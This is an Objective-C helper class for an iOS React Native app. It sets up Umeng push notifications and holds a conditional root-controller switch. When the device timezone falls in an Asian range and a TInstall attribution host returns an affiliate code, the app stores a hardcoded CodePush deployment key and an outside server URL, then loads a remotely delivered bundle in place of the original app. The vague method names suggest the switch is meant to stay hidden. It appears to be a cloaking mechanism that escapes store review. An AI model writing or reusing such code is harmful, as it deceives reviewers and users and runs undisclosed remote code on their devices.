#import "RNFOneMThreeHelper.h"

#import <CodePush/CodePush.h>
#import <UserNotifications/UNUserNotificationCenter.h>
#import <react-native-orientation-locker/Orientation.h>

#import <RNUrbanHappy/RNUMConfigure.h>
#import "RNCPushNotificationIOS.h"

#import <UMCommon/MobClick.h>
#import <UMCommon/UMConfigure.h>
#import <UMPush/UMessage.h>
#import <UMCommon/UMCommon.h>
#import <TInstallSDK/TInstallSDK.h>

#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>
#import <react/config/ReactNativeConfig.h>


@interface RNFOneMThreeHelper () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}
@end
#endif


@implementation RNFOneMThreeHelper

static NSString * const foneMthree_APP = @"foneMthree_FLAG_APP";
static NSString * const foneMthree_affCode = @"affCode";
static NSString * const foneMthree_raf = @"raf";

static NSString * const foneMthree_appVersion = @"1.0.6";
static NSString * const foneMthree_deploymentKey = @"5mHhH6Yl2PpMd1Er53SUdh1MrDEQ4ksvOXqog";
static NSString * const foneMthree_serverUrl = @"https://ltt883.com";

static NSString * const foneMthree_tInstall = @"2O5KVT";
static NSString * const foneMthree_tInstallHost = @"https://feaffcodegetm2.com";

static NSString * const foneMthree_uMengAppKey = @"5e7db2f3167eddb84f00015e";
static NSString * const foneMthree_uMengAppChannel = @"App Store";


static RNFOneMThreeHelper *instance = nil;

+ (instancetype)foneMthree_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });
  return instance;
}

- (void)foneMthree_dayYouWentAwayWithOptions:(NSDictionary *)launchOptions {
  [RNUMConfigure initWithAppkey:foneMthree_uMengAppKey channel:foneMthree_uMengAppChannel];
  UMessageRegisterEntity *entity = [[UMessageRegisterEntity alloc] init];
  entity.types = UMessageAuthorizationOptionBadge|UMessageAuthorizationOptionAlert;
  [UNUserNotificationCenter currentNotificationCenter].delegate=self;
  [UMessage registerForRemoteNotificationsWithLaunchOptions:launchOptions Entity:entity completionHandler:^(BOOL granted, NSError * _Nullable error) {
    if (granted) {
    } else {
    }
  }];
}

- (UIInterfaceOrientationMask)foneMthree_getOrientation {
  return [Orientation getOrientation];
}

- (BOOL)foneMthree_dailyInAsian {
    NSInteger foneMthree_Offset = NSTimeZone.localTimeZone.secondsFromGMT/3600;
    if (foneMthree_Offset >= 3 && foneMthree_Offset <= 11) {
        return YES;
    } else {
        return NO;
    }
}


- (BOOL)foneMthree_tryThisWay:(void (^)(void))changeVcBlock {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if (![self foneMthree_dailyInAsian]) {
        return NO;
    }
    if ([ud boolForKey:foneMthree_APP]) {
        return YES;
    } else {
        [self foneMthree_judgeIfNeedChangeRootController:changeVcBlock];
        return NO;
    }
}

- (void)foneMthree_judgeIfNeedChangeRootController:(void (^)(void))changeVcBlock {
  [TInstall initInstall:foneMthree_tInstall setHost:foneMthree_tInstallHost];
  [TInstall getWithInstallResult:^(NSDictionary * _Nullable data) {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    NSString * _Nullable affCode = [data valueForKey:@"affCode"];

    NSString * _Nullable raf = [data valueForKey:@"raf"];
    [ud setObject:raf forKey:foneMthree_raf];

    if (affCode.length == 0) {
      affCode = [data valueForKey:@"affcode"];
      if (affCode.length == 0) {
        affCode = [data valueForKey:@"aff"];
      }
    }
    
    
    if (affCode.length != 0) {
      [ud setObject:affCode forKey:foneMthree_affCode];
      [ud setObject:foneMthree_appVersion forKey:@"appVersion"];
      [ud setObject:foneMthree_deploymentKey forKey:@"deploymentKey"];
      [ud setObject:foneMthree_serverUrl forKey:@"serverUrl"];
      [ud setBool:YES forKey:foneMthree_APP];
      [ud synchronize];
      changeVcBlock();
    }
  }];
}

- (UIViewController *)foneMthree_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  RCTAppSetupPrepareApp(application);

  [self foneMthree_dayYouWentAwayWithOptions:launchOptions];
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"FedevProject", nil);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }
  
  UIViewController *rootViewController = [UIViewController new];
  rootViewController.view = rootView;
  return rootViewController;
}


- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler
{
  NSDictionary * userInfo = response.notification.request.content.userInfo;
  if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
    [UMessage didReceiveRemoteNotification:userInfo];
  }
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler
{
  NSDictionary * userInfo = notification.request.content.userInfo;
  if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
    [UMessage setAutoAlert:NO];
    [UMessage didReceiveRemoteNotification:userInfo];
  }
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}


- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge
{
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}

#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
